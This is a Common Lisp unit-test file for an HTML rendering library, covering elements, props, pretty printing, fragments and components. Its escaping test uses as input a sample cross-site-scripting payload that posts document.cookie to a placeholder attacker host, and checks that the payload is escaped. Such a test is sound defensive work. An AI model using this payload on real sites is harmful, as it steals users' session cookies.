(defpackage #:hsx-test/element
  (:use #:cl
        #:fiveam
        #:hsx/element)
  (:import-from #:named-readtables
                #:in-readtable)
  (:import-from #:mstrings
                #:mstring-syntax))
(in-package #:hsx-test/element)
(in-readtable mstring-syntax)

(def-suite element-test)
(in-suite element-test)

(test element-class
  (is (typep (create-element :div nil nil) 'tag))
  (is (typep (create-element :html nil nil) 'html-tag))
  (is (typep (create-element :<> nil nil) 'fragment))
  (is (typep (create-element (lambda ()) nil nil) 'component))
  (signals error (create-element "div" nil nil)))

(test flatten-children
  (let* ((elm (create-element :p
                              nil
                              (list "a"
                                    nil
                                    (list "b" (list nil "c"))
                                    (cons "d" "e")))))
    (is (equal (list "a" "b" "c" "d" "e") (element-children elm)))))

(test empty-element
  (is (string= "<div></div>"
               (render-to-string (create-element :div nil nil)))))

(test element-with-props
  (is (string= "<div prop1=\"value1\" prop2></div>"
               (render-to-string (create-element :div 
                                                 (list :prop1 "value1"
                                                       :prop2 t
                                                       :prop3 nil)
                                                 nil)))))

(test element-with-children
  (is (string= "<p>foo</p>"
               (render-to-string (create-element :p
                                                 nil
                                                 (list "foo"))
                                 :pretty t)))
  (is (string= #M"<p>
                 \  <span>foo</span>
                  </p>"
               (render-to-string (create-element :p
                                                 nil
                                                 (list (create-element :span
                                                                       nil
                                                                       (list "foo"))))
                                 :pretty t)))
  (is (string= #M"<p>
                 \  foo
                 \  <span>bar</span>
                  </p>"
               (render-to-string (create-element :p
                                                 nil
                                                 (list "foo"
                                                       (create-element :span
                                                                       nil
                                                                       (list "bar"))))
                                 :pretty t))))

(test element-with-props-and-children
  (is (string=  "<p prop1=\"value1\" prop2>foo</p>"
                (render-to-string (create-element :p
                                                  (list :prop1 "value1"
                                                        :prop2 t
                                                        :prop3 nil)
                                                  (list "foo"))
                                  :pretty t)))
  (is (string= #M"<p prop1=\"value1\" prop2>
                 \  foo
                 \  <span>bar</span>
                  </p>"
               (render-to-string  (create-element :p
                                                  (list :prop1 "value1"
                                                        :prop2 t
                                                        :prop3 nil)
                                                  (list "foo"
                                                        (create-element :span
                                                                        nil
                                                                        "bar")))
                                  :pretty t))))

(test self-closing-tag
  (is (string= "<img src=\"/background.png\">"
               (render-to-string (create-element :img
                                                 (list :src "/background.png")
                                                 nil)
                                 :pretty t))))

(test escaping-tag
  (is (string= "<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>"
               (render-to-string
                (create-element :div
                                nil
                                (list "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))))))

(test non-escaping-tag
  (is (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
               (render-to-string
                (create-element :script
                                nil
                                "alert('<< Do not embed user-generated contents here! >>')")))))

(test fragment
  (let ((frg (create-element :<>
                             nil
                             (list (create-element :li
                                                   nil
                                                   (list "bar"))
                                   (create-element :li
                                                   nil
                                                   (list "baz"))))))
    (is (string= #M"<li>bar</li>
                    <li>baz</li>"
                 (render-to-string frg :pretty t)))
    (is (string= #M"<ul>
                   \  <li>foo</li>
                   \  <li>bar</li>
                   \  <li>baz</li>
                   \  <li>brah</li>
                    </ul>"
                 (render-to-string (create-element :ul
                                                   nil
                                                   (list (create-element :li
                                                                         nil
                                                                         (list "foo"))
                                                         frg
                                                         (create-element :li
                                                                         nil
                                                                         (list "brah"))))
                                   :pretty t)))))

(defun comp1 (&key prop children)
  (create-element :div
                  nil
                  (list prop
                        children)))

(test component-accepting-keyword-args
  (let ((elm (expand-component (create-element #'comp1
                                               '(:prop "value")
                                               (list "child")))))
    (is (eq :div (element-type elm)))
    (is (equal (list "value" "child") (element-children elm)))))

(defun comp2 (&rest props)
  (create-element :div
                  nil
                  (list (getf props :prop)
                        (getf props :children))))

(test component-accepting-property-list
  (let ((elm (expand-component (create-element #'comp2
                                               '(:prop "value")
                                               (list "child")))))
    (is (eq :div (element-type elm)))
    (is (equal (list "value" "child") (element-children elm)))))

(defun comp3 (&rest props &key prop children &allow-other-keys)
  (create-element :div
                  nil
                  (list prop
                        children
                        (getf props :other-key))))

(test component-accepting-keyword-args-and-property-list
  (let ((elm (expand-component (create-element #'comp3
                                               '(:prop "value" :other-key "other")
                                               (list "child")))))
    (is (eq :div (element-type elm)))
    (is (equal (list "value" "child" "other") (element-children elm)))))
